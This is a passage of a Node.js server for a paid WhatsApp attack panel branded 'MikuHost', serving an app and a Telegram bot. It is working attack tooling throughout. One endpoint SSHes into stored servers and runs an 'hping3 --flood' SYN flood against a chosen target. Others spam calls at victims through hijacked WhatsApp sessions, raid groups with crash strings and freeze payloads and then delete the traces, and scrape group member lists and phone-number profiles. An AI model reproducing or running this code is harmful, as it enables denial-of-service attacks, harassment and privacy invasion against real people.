const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const { default: makeWASocket, prepareWAMessageMedia, useMultiFileAuthState, DisconnectReason, generateWAMessage, getBuffer, generateWAMessageFromContent, proto, generateWAMessageContent, fetchLatestBaileysVersion, waUploadToServer, generateRandomMessageId, generateMessageTag, jidEncode, getUSyncDevices } = require("@mikudeveloper/grace");
const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const server = http.createServer(app); // gunakan Express app
const wss = new WebSocket.Server({ server });
let wsClients = {}; // { username: WebSocket }
let chatList = [];  // { from, to, message, time }
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const DB_PATH = "./database.json";
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
const bugs = [
  //{ bug_id: "crash_spam", bug_name: "Spam Crash" },
  { bug_id: "halo", bug_name: "MENGETES MASALALU NYA (tes sender)" },
  { bug_id: "delay", bug_name: "MELIHAT RESPON NYA (delay)" },
  { bug_id: "combo", bug_name: "COMBO" },
  { bug_id: "stuck_v3", bug_name: "Stuck V3" },
  { bug_id: "stuck_logo", bug_name: "STUCK LOGO" },
  { bug_id: "stuck_v2", bug_name: "Stuck V2" },
];
let cncActive = true; // Flag CNC
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
fs.watchFile("keyList.json", () => {
  console.log("[📂] keyList.json changed, reloading...");
  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
});


// Load chat from file
if (fs.existsSync(CHAT_FILE)) {
  chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
}

// Simpan chat
function saveChat() {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}

// Sanitize fungsi
function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '') // hilangkan tag html
    .replace(/[\r\n]/g, ' ') // hilangkan newline
    .slice(0, 250); // batas 250 karakter
}

// ===== MIKUHOST: Telegram opsional via botconfig.json =====
let bot = null;
let ID_GROUP = [];
let ID_GROUP_UTAMA = [];
let OWNER_ID = 0;
try {
  const BOTCFG = JSON.parse(fs.readFileSync(path.join(__dirname, 'botconfig.json'), 'utf8'));
  if (BOTCFG.token && BOTCFG.token.length > 20) {
    bot = new TelegramBot(BOTCFG.token, { polling: true });
    ID_GROUP = BOTCFG.groups || [];
    ID_GROUP_UTAMA = BOTCFG.mainGroups || [];
    OWNER_ID = BOTCFG.ownerId || 0;
    console.log("[🤖] Telegram bot aktif (botconfig.json)");
  } else {
    console.log("[🤖] Bot Telegram nonaktif (token kosong di botconfig.json)");
  }
} catch (e) {
  console.log("[🤖] Bot Telegram nonaktif (botconfig.json tidak ada)");
}

function sendToGroups(text, options = {}) {
    if (!bot) return;
    for (const groupid of ID_GROUP) {
        bot.sendMessage(groupid, text, options).catch(err => {
            console.error(`Gagal kirim ke ${groupid}:`, err.response?.body || err.message);
        });
    }
}

function sendToGroupsUtama(text, options = {}) {
    if (!bot) return;
    for (const groupid of ID_GROUP_UTAMA) {
        bot.sendMessage(groupid, text, options).catch(err => {
            console.error(`Gagal kirim ke ${groupid}:`, err.response?.body || err.message);
        });
    }
}

// MIKUHOST: stub no-op jika bot nonaktif agar semua handler tetap aman
if (!bot) {
  const noop = () => {};
  bot = {
    on: noop, onText: noop, once: noop,
    sendMessage: async () => ({}), answerCallbackQuery: async () => ({}),
    getFile: async () => ({ file_path: "" }), sendDocument: async () => ({}),
    sendLocation: async () => ({}),
  };
}
  
wss.on('connection', function (ws, req) {
  let username;

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

        if (data.type === 'sessionCheck') {
  const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
  const user = sessionList.find(e => e.sessionKey === data.key);

  if (!user) {
    ws.send(JSON.stringify({
      type: "forceLogout",
      reason: "Invalid key"
    }));
    return ws.close();
  }

  if (user.androidId !== data.androidId) {
    ws.send(JSON.stringify({
      type: "forceLogout",
      reason: "Another device has logged in"
    }));
    return ws.close();
  }
}

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
        const validId = session.find(e => e.androidId === data.androidId)
          
        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        // Autentikasi sukses
        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: session.username,
          androidId: session.androidId,
          role: session.role || "member"
        }));

            const interval = setInterval(() => {
            const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
        const validId = session.find(e => e.androidId === data.androidId)
          
        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

            }, 10000);
      }
      if (data.type === 'auth') {
        username = getUserByKey(data.key);
         console.log(username)
        if (!username) return ws.close();
        wsClients[username] = ws;

        // Kirim chatList awal
const list = chatList
  .filter(m => m.from === username || m.to === username)
  .map(m => (m.from === username ? m.to : m.from));

  ws.send(JSON.stringify({
    type: "chatList",
    users: [...new Set(list)],
  }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        // Kirim ke pengirim
        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        // Kirim ke penerima jika online
        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }
    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});

// Ganti listen jadi ini:
const wsPort = 2276;
server.listen(wsPort, () => {
  console.log(`🟣 Server running on http://localhost:${wsPort}`);
});

const PORT = 2276;




app.use(express.urlencoded({ extended: false }));
app.use(express.json());

// ===== MIKUHOST: dukung prefix /apidv (jika gateway tidak meng-strip prefix) =====
app.use((req, res, next) => {
  if (req.url === '/apidv' || req.url.startsWith('/apidv/')) {
    req.url = req.url.slice(6) || '/';
  }
  next();
});
// ===== Rate Limit Middleware (20 req/detik per token) =====
const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);


app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*"); // atau ganti * dengan domain spesifik
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

// ===== 🌐 GLOBAL SENDER: role helpers & endpoint kelola (dipakai APK + Telegram) =====
// canUseGlobalSender  : semua role KECUALI member biasa (vip, owner, reseller, admin, reseller1)
// canManageGlobalSender: hanya owner & admin yang boleh MENAMBAH/MENGHAPUS sender global
function canManageGlobalSender(user) {
  return ['owner', 'admin'].includes((user?.role || 'member').toLowerCase());
}

function getUserBySessionKey(key) {
  const keyInfo = activeKeys[key];
  if (!keyInfo) return null;
  const db = loadDatabase();
  return db.find(u => u.username === keyInfo.username) || null;
}

// Tambah sender global (owner/admin).
// Dua cara: kirim { creds: {...} } (paste JSON creds langsung, dipakai APK)
// atau kirim { file: "nama.json" } yang sudah di-upload ke permenmd/uploads/
app.post("/addGlobalSender", (req, res) => {
  const { key, file, creds } = req.body || {};
  const user = getUserBySessionKey(key);
  if (!user) return res.json({ valid: false, message: "Invalid key" });

  if (!canManageGlobalSender(user)) {
    return res.json({ valid: true, authorized: false, message: "Hanya owner/admin yang bisa menambah sender global." });
  }

  try {
    let parsed = null;
    let srcName = null;

    if (creds && typeof creds === 'object') {
      parsed = creds; // paste langsung dari APK
    } else {
      const uploadsDir = path.join('permenmd', 'uploads');
      const fileName = (file || '').replace(/[\\/]/g, '');
      const src = path.join(uploadsDir, fileName);
      if (!fileName.endsWith('.json') || !fs.existsSync(src)) {
        const available = fs.existsSync(uploadsDir) ? fs.readdirSync(uploadsDir).filter(f => f.endsWith('.json')) : [];
        return res.json({ valid: true, added: false, message: "File tidak ditemukan di permenmd/uploads.", available });
      }
      parsed = JSON.parse(fs.readFileSync(src, 'utf8'));
      srcName = src;
    }

    if (!isValidBaileysCreds(parsed)) {
      return res.json({ valid: true, added: false, message: "Data bukan creds Baileys yang valid." });
    }

    let num = String(parsed?.me?.user?.id || '').replace(/\D/g, '');
    if (!num) num = srcName ? (path.basename(srcName, '.json').replace(/\D/g, '') || `global-${Date.now()}`) : `global-${Date.now()}`;

    if (!fs.existsSync(GLOBAL_SENDER_DIR)) fs.mkdirSync(GLOBAL_SENDER_DIR, { recursive: true });
    fs.writeFileSync(path.join(GLOBAL_SENDER_DIR, `${num}.json`), JSON.stringify(parsed));

    const sessDir = path.join(GLOBAL_SENDER_DIR, num);
    if (!fs.existsSync(sessDir)) fs.mkdirSync(sessDir, { recursive: true });
    fs.writeFileSync(path.join(sessDir, 'creds.json'), JSON.stringify(parsed));

    if (srcName) fs.rmSync(srcName, { force: true }); // bersihkan dari uploads

    connectGlobalSenders().then(() => {
      console.log(`[🌐 GLOBAL] ${user.username} (${user.role}) menambah sender global ${maskNumber(num)}`);
    });

    return res.json({
      valid: true,
      authorized: true,
      added: true,
      number: maskNumber(num),
      message: `Sender global ${maskNumber(num)} ditambahkan, menyambungkan...`
    });
  } catch (err) {
    return res.json({ valid: true, added: false, message: `Gagal: ${err.message}` });
  }
});

// Hapus sender global (owner/admin) — parameter number boleh ter-sensor (628•••••47)
app.post("/delGlobalSender", (req, res) => {
  const { key, number } = req.body || {};
  const user = getUserBySessionKey(key);
  if (!user) return res.json({ valid: false, message: "Invalid key" });

  if (!canManageGlobalSender(user)) {
    return res.json({ valid: true, authorized: false, message: "Hanya owner/admin yang bisa menghapus sender global." });
  }

  const input = String(number || '');
  const names = getGlobalSenderFolder();
  const target = input.includes('•')
    ? names.find(n => maskNumber(n) === input)
    : names.find(n => n === input.replace(/\D/g, ''));

  if (!target) return res.json({ valid: true, deleted: false, message: "Sender global tidak ditemukan." });

  if (activeConnections[target]) {
    try { activeConnections[target].ws.close(); } catch (_) {}
    delete activeConnections[target]; delete biz[target]; delete mess[target];
  }
  // Hapus folder sesi pairing + snapshot creds
  try { fs.rmSync(path.join(GLOBAL_SENDER_DIR, target), { recursive: true, force: true }); } catch (_) {}
  fs.rmSync(path.join(GLOBAL_SENDER_DIR, `${target}.json`), { force: true });

  console.log(`[🌐 GLOBAL] ${user.username} (${user.role}) menghapus sender global ${maskNumber(target)}`);
  return res.json({ valid: true, authorized: true, deleted: true, message: `Sender global ${maskNumber(target)} dihapus.` });
});

// Upload creds.json mentah (multipart form, field "file") ke permenmd/uploads (owner/admin)
app.post("/uploadGlobalCreds", (req, res) => {
  const key = (req.query && req.query.key) || (req.body && req.body.key);
  const user = getUserBySessionKey(key);
  if (!user) return res.json({ valid: false, message: "Invalid key" });

  if (!canManageGlobalSender(user)) {
    return res.json({ valid: true, authorized: false, message: "Hanya owner/admin yang bisa upload sender global." });
  }

  const ct = req.headers['content-type'] || '';
  if (!ct.includes('multipart/form-data')) {
    return res.status(400).json({ valid: false, message: "Kirim sebagai multipart/form-data, field 'file'." });
  }

  const boundary = ct.split('boundary=')[1];
  if (!boundary) return res.status(400).json({ valid: false, message: "Boundary tidak ditemukan." });

  const chunks = [];
  req.on('data', c => chunks.push(c));
  req.on('end', () => {
    try {
      const body = Buffer.concat(chunks);
      const parts = [];
      let start = body.indexOf(`--${boundary}`);
      while (start !== -1) {
        const head = body.indexOf('\r\n\r\n', start);
        if (head === -1) break;
        const next = body.indexOf(`--${boundary}`, head);
        if (next === -1) break;
        parts.push(body.slice(head + 4, next - 2));
        start = next;
      }
      if (!parts.length) return res.json({ valid: false, message: "File tidak terbaca." });

      const json = JSON.parse(parts[0].toString('utf8'));
      if (!isValidBaileysCreds(json)) {
        return res.json({ valid: true, saved: false, message: "File bukan creds Baileys yang valid." });
      }

      const uploadsDir = path.join('permenmd', 'uploads');
      if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir, { recursive: true });
      const name = String(json?.me?.user?.id || '').replace(/\D/g, '') || `upload-${Date.now()}`;
      fs.writeFileSync(path.join(uploadsDir, `${name}.json`), JSON.stringify(json));

      return res.json({ valid: true, saved: true, file: `${name}.json`, number: maskNumber(name), message: "Berhasil diupload. Lanjut /addGlobalSender untuk mengaktifkan." });
    } catch (err) {
      return res.json({ valid: false, message: `Gagal memproses file: ${err.message}` });
    }
  });
});


if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData); // ini array

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000; // +10 menit

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}


function connectToAllVPS() {
  if (!cncActive) return;

  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end(); // Langsung tutup kalau CNC tidak aktif
        return;
      }

      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      // Jika koneksi putus, reconnect otomatis
      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

// 🚫 Disconnect semua koneksi (misal saat restart)
function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

// Load VPS list saat server pertama kali jalan
if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
  console.log("📥 VPS list loaded.");
    connectToAllVPS(); // Connect ke semua VPS saat server jalan
}

// Pantau perubahan file VPS
fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
      connectToAllVPS(); // Connect ke semua VPS saat server jalan
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

// Middleware: Cek sessionKey dan ambil username
function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

// GET /myServer
app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

// POST /addServer
app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body || {};
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

// POST /delServer
app.post("/delServer", (req, res) => {
  const { key, host } = req.body || {};
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

// POST /sendCommand
app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body || {};
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});


function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}
const spamCooldown = {}; // { username: { count, lastReset } }
const cooldowns = {}; // { username: lastRaidTime }

app.get("/spamCall", async (req, res) => {
  const { key, target, qty } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !["reseller", "reseller1", "owner", "vip"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const role = user.role || "member";
  const maxQty = role === "vip" ? 10 : 5;
  const callQty = parseInt(qty) || 1;

  if (callQty > maxQty) {
    return res.json({
      valid: false,
      message: `Qty too high. Max allowed for your role (${role}) is ${maxQty}.`
    });
  }

  const bizKeys = Object.keys(activeConnections);
  if (!bizKeys.length) return res.json({ valid: false, message: "No biz socket online" });

  const jid = target.includes("@s.whatsapp.net") ? target : `${target}@s.whatsapp.net`;

  const now = Date.now();
  const cooldown = spamCooldown[user.username] || { count: 0, lastReset: 0 };

  if (now - cooldown.lastReset > 300_000) {
    cooldown.count = 0;
    cooldown.lastReset = now;
  }

  if (cooldown.count >= 5) {
    const remaining = 300 - Math.floor((now - cooldown.lastReset) / 1000);
    return res.json({ valid: false, cooldown: true, message: `Cooldown: wait ${remaining}s` });
  }

  try {
      
    const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
    const sock = biz[socketId];
    // 1. Unblock target dulu
    await sock.updateBlockStatus(jid, "unblock");

    await sock.offerCall(jid, true);dulu
    await sock.updateBlockStatus(jid, "block");
    console.log(`[✅ FIRST SPAM CALL] to ${jid} via ${socketId ? 'sender ' + maskNumber(socketId) : 'sender (tidak diketahui)'}`);

    cooldown.count++;
    spamCooldown[user.username] = cooldown;

    res.json({ valid: true, sended: true, total: callQty });

    for (let i = 1; i < callQty; i++) {
      setTimeout(async () => {
        try {
          const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
          const sock = biz[socketId];
                // 1. Unblock target dulu
    await sock.updateBlockStatus(jid, "unblock");

    await sock.offerCall(jid, true);
                // 1. Unblock target dulu
    await sock.updateBlockStatus(jid, "block");

          console.log(`[✅ SPAM CALL] #${i + 1} to ${jid} via ${socketId ? 'sender ' + maskNumber(socketId) : 'sender (tidak diketahui)'}`);
        } catch (err) {
          console.warn(`[❌ CALL #${i + 1} ERROR]`, err.message);
        }
      }, i * 10000);
    }
  } catch (err) {
    console.warn("[❌ FIRST CALL ERROR]", err.message);
    return res.json({ valid: false, message: "Call failed" });
  }
});

app.get("/raidGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid group link" });

  return res.json({ valid: true, sended: false });
  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !["vip", "owner"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const now = Date.now();
  if (cooldowns[user.username] && now - cooldowns[user.username] < 500_000) {
    const wait = Math.ceil((500_000 - (now - cooldowns[user.username])) / 1000);
    return res.json({ valid: false, message: `Cooldown aktif, tunggu ${wait} detik` });
  }

  const bizKeys = Object.keys(biz);
  if (bizKeys.length < 2) return res.json({ valid: false, message: "Need at least 2 bot online" });

  const fs = require("fs");
  const path = require("path");
  const dir = path.join(__dirname, "assets");
  const stickers = fs.readdirSync(dir).filter(f => f.endsWith(".webp"));
  if (!stickers.length) return res.json({ valid: false, message: "No stickers found" });

  try {
    const pickRandomSock = async (used = []) => {
      const unused = bizKeys.filter(k => !used.includes(k));
      if (!unused.length) throw new Error("No available bots to use");
      const randKey = unused[Math.floor(Math.random() * unused.length)];
      return { sock: biz[randKey], key: randKey };
    };

    const joinGroup = async () => {
      const usedKeys = [];
      while (true) {
        const { sock, key } = await pickRandomSock(usedKeys);
        usedKeys.push(key);
        try {
          const groupJid = await sock.groupAcceptInvite(code);
          return { sock, groupJid };
        } catch (err) {
          if (err.message.includes("not-authorized")) {
            console.log(`[!] ${key} gagal join, coba bot lain...`);
            continue;
          } else {
            throw err;
          }
        }
      }
    };

    const [s1, s2] = await Promise.all([joinGroup(), joinGroup()]);
    res.json({ valid: true, sended: true });

    cooldowns[user.username] = Date.now();

    const raidBot = async (sock, groupJid) => {
      for (let round = 0; round < 2; round++) {
        const sentMsg = await sock.sendMessage(groupJid, {
          text: `[MikuHost Project]\n` + 'ꦾ'.repeat(30000)
        });
        await new Promise(r => setTimeout(r, 1000));

        const randomStickers = stickers.sort(() => 0.5 - Math.random()).slice(0, 3);
        for (const sticker of randomStickers) {
          const buffer = fs.readFileSync(path.join(dir, sticker));
          await sock.sendMessage(groupJid, { sticker: buffer });
          await gcCrash(sock, groupJid);
          await FreezePackk(sock, groupJid);
          await new Promise(r => setTimeout(r, 300));
        }

        await new Promise(r => setTimeout(r, 600));
      }

      await sock.groupLeave(groupJid);
      await new Promise(r => setTimeout(r, 500));

      const lastMessagesInChat = {
        key: { remoteJid: groupJid, fromMe: true, id: "" },
        messageTimestamp: Math.floor(Date.now() / 1000)
      };
      await sock.chatModify({
        delete: true,
        lastMessages: [lastMessagesInChat]
      }, groupJid);

      console.log(`[!] Selesai raid & hapus chat: ${groupJid}`);
    };

    await Promise.all([
      raidBot(s1.sock, s1.groupJid),
      raidBot(s2.sock, s2.groupJid)
    ]);

    return;
  } catch (err) {
    console.warn("[❌ RAID ERROR]", err.message);
    return res.json({ valid: false, message: "Join or send failed" });
  }
});

app.get("/spyGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid link" });

  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No socket available" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];

  try {
    const groupJid = await sock.groupAcceptInvite(code);
    const metadata = await sock.groupMetadata(groupJid);

    const admins = metadata.participants.filter(p => p.admin).map(p => p.id.replace(/@.+/, ''));
    const members = metadata.participants.filter(p => !p.admin).map(p => p.id.replace(/@.+/, ''));

    await sock.groupLeave(groupJid);

    return res.json({
      valid: true,
      groupId: groupJid,
      groupName: metadata.subject,
      desc: metadata.desc || "No description",
      admin: admins,
      participant: members,
    });
  } catch (err) {
    console.warn("[❌ SPY GROUP ERROR]", err.message);
    return res.json({ valid: false, message: "Spy failed" });
  }
});

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];                // file belum ada / rusak → mulai kosong
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

  const news = [
    {
      image: "https://files.catbox.moe/amfv0i.jpg",
      title: "MikuHost",
      desc: "Buy Access Chat t.me/mikuhost"
    },
    {
      image: "https://files.catbox.moe/4pn72b.jpg",
      title: "MikuHost",
      desc: "Join channel t.me/mikuhost"
    }
  ];

// ===== Endpoint: Login & Key Fetch (version 3.0 required) =====
app.post("/validate", (req, res) => {
const { username, password, version, androidId } = req.body || {};

if (!androidId) {
  return res.json({ valid: false, message: "androidId required" });
}

const db = loadDatabase();
const user = db.find(u => u.username === username && u.password === password);

if (!user) return res.json({ valid: false });

if (isExpired(user)) {
  return res.json({ valid: true, expired: true });
}

// Cek apakah device sama
const keyList = loadKeyList();
const existingSession = keyList.find(e => e.username === username);
if (existingSession && existingSession.androidId !== androidId) {
  // device berbeda, override
  console.log(`[📱] Device login baru, override session untuk ${username}`);
}

// generate key baru & override
const key = generateKey();
activeKeys[key] = {
  username,
  created: Date.now(),
  expires: Date.now() + 10 * 60 * 1000,
};

recordKey({
  username,
  key,
  role: user.role || 'member',
